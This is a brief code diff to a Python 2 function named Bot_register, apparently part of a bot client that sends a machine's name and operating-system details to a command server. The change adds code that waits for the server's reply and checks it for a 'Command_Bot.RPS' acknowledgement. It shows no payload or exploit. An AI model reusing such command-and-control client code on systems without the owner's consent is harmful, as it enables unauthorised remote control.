@@ -76,9 +76,14 @@ def Bot_register(bot_socket, pc_name, operation_system, operation_system_version
 
     try:
       bot_socket.send(rg_string.encode('ascii'))
-      rg_boll = False
       
-      return True#!rg_boll
+      sv_response = str(bot_socket.recv(1024))
+      print sv_response
+      
+      if(sv_response.split('{')[0] == 'Command_Bot.RPS' and sv_response.split('{')[1].split('}')[0] == 'True'):
+        rg_boll = False
+        
+        return True #!rg_boll
 
     except:
       rg_boll = True
